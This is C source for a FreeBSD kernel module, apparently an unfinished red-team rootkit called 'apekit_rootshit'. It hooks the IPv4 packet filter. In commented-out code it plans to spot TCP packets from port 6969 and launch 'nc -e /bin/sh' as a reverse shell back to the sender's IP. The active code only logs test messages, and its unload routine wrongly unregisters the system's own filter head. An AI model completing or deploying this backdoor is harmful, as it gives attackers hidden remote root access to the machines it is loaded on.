#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/socketvar.h>
#include <sys/protosw.h>
#include <sys/systm.h>
#include <sys/types.h>
#include <sys/mbuf.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/proc.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/exec.h>
#include <net/pfil.h>
#include <netinet/ip_var.h>
#include <net/if.h>
#include <sys/syslog.h>

// replaces all instances of TRIGGER_PORT in the code with 6969 before compilation
#define TRIGGER_PORT 6969

/*
 * Global variables to hold references to our head and hook.
 * We need these in order to unlink/unregister them during unload.
 */
static pfil_head_t g_ph    = NULL;
static pfil_hook_t g_hook  = NULL;

static pfil_return_t my_packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir, void *arg, struct inpcb *inp) {
    // struct mbuf *m = *mp;
    // struct ip *ip_header;
    // struct tcphdr *tcp_header;

    // // Ensure mbuf is valid
    // if (m == NULL) return PFIL_PASS;;

    // // Make sure the packet has enough data for an IP header
    // if (m->m_len < sizeof(struct ip)) {
    //     m = m_pullup(m, sizeof(struct ip));
    //     if (m == NULL) return PFIL_PASS;;
    // }
   
    // // Extract the IP header
    // ip_header = mtod(m, struct ip *);
    // // Check if it's a TCP packet
    // if (ip_header->ip_p != IPPROTO_TCP) return PFIL_PASS;;

    // // Extract the TCP header
    // tcp_header = (struct tcphdr *)((caddr_t)ip_header + (ip_header->ip_hl << 2));
    // // Check source port
    // if (ntohs(tcp_header->th_sport) != TRIGGER_PORT) return PFIL_PASS;;

    // // Ensure there's enough data for TCP header
    // if (m->m_len < (ip_header->ip_hl << 2) + sizeof(struct tcphdr)) {
    //     m = m_pullup(m, (ip_header->ip_hl << 2) + sizeof(struct tcphdr));
    //     if (m == NULL) return PFIL_PASS;;
    // }



    // now we know the packet is a red-team packet
    // Extract attacker IP and store as a string (since inet_ntoa() isn't available in kernel space)
    // char attacker_ip_str[16];
    //snprintf(attacker_ip_str, sizeof(attacker_ip_str), "%u.%u.%u.%u",
        // (ntohl(ip_header->ip_src.s_addr) >> 24) & 0xFF,
        // (ntohl(ip_header->ip_src.s_addr) >> 16) & 0xFF,
        // (ntohl(ip_header->ip_src.s_addr) >> 8) & 0xFF,
        // ntohl(ip_header->ip_src.s_addr) & 0xFF);

    // Construct the reverse shell command
    // char reverse_shell_cmd[100];
    //snprintf(reverse_shell_cmd, sizeof(reverse_shell_cmd),
       // "nc -e /bin/sh %s %d", attacker_ip_str, TRIGGER_PORT);

    log(LOG_NOTICE, "[Kernel Module] working!\n");
    log(LOG_NOTICE, "[Kernel Module] working!\n");
    log(LOG_NOTICE, "[Kernel Module] working!\n");
    printf("yessir is working!!!");

    //printf("%s\n", reverse_shell_cmd);
    //printf("[LKM] Triggering reverse shell to %s on port 6969\n", attacker_ip_str);
    
    return PFIL_PASS;

}
        
    
// static int load_head(void) {

//     struct pfil_head_args pha = {
//         .pa_version = PFIL_VERSION,
//         .pa_flags = 0,
//         .pa_type = PFIL_TYPE_IP4,
//         .pa_headname = "custom_filter_apeshit"
//     };

//     g_ph = pfil_head_register(&pha);

//     if (g_ph == NULL) {
//         printf("[LKM] Could not register custom pfil_head\n");
//         return (ENOMEM);
//     }
//     printf("[LKM] Custom pfil_head registered: %s\n", pha.pa_headname);
//     return (0);
// };

static int get_pfil_head(void) {
    // Retrieve the existing IPv4 filtering head
    g_ph = V_inet_pfil_head;

    if (g_ph == NULL) {
        printf("[LKM] Failed to get existing IPv4 pfil_head\n");
        return (ENOENT);
    }

    return (0);

}




// Load function: Attach our packet filter
static int load_hook(void) {

    struct pfil_hook_args ha = {
        .pa_version = PFIL_VERSION,         // Version of the pfil framework
        .pa_flags = 0,                       /* Not specifying PFIL_IN/PFIL_OUT here */
        .pa_type = PFIL_TYPE_IP4,            // Type of filter (address family)
        .pa_mbuf_chk = my_packet_filter,       // Function to process packets
        .pa_mem_chk = NULL,                 // No memory-based checks (set to NULL if unused)
        .pa_ruleset = NULL,                 // No custom ruleset (set to NULL if unused)
        .pa_modname = "apeshit filtering",          // Module name
        .pa_rulname = "apeshit 6969 packet"             // Rule name
    };

    // pfil_hook_t	pfil_add_hook(struct pfil_hook_args *);
    g_hook = pfil_add_hook(&ha);

    if (g_hook == NULL) {
        // Handle error
        printf("mannnn that shit aint work");
        return (ENOMEM);
    }

    printf("[LKM] Packet filter module loaded\n");
    return 0;
}

static int load_link(void) {

    struct pfil_link_args la = {
        .pa_version = PFIL_VERSION,
        .pa_flags   = PFIL_IN | PFIL_OUT | PFIL_HEADPTR | PFIL_HOOKPTR,
        .pa_head    = g_ph,
        .pa_hook    = g_hook,
    };

    int err = pfil_link(&la);
    if (err != 0) {
        printf("[LKM] pfil_link failed: %d\n", err);
        return err;
    }
    printf("[LKM] pfil_link success for inbound packets\n");
    return 0;
}

static void unload(void) {
    if (g_hook) {
        pfil_remove_hook(g_hook);
        g_hook = NULL;
        printf("[LKM] pfil_hook removed\n");
    }
    if (g_ph) {
        pfil_head_unregister(g_ph);
        g_ph = NULL;
        printf("[LKM] pfil_head unregistered\n");
    }
}



static int event_handler(struct module *module, int event, void *arg) {
    switch (event) {
        case MOD_LOAD:
            // load_head_case = load_head();
            // load_hook_case = load_hook();
            // load_link_case = load_link();
            // load_head();
            get_pfil_head();
            load_hook();
            load_link();
            return 0;
        case MOD_UNLOAD:
            unload();
            printf("[LKM] Module unloaded.\n");
            return 0;
        default:
            return EOPNOTSUPP;
    }
}


static moduledata_t module_data = {
    "apekit_rootshit",
    event_handler,
    NULL
};


DECLARE_MODULE(reverse_shell_lkm, module_data, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);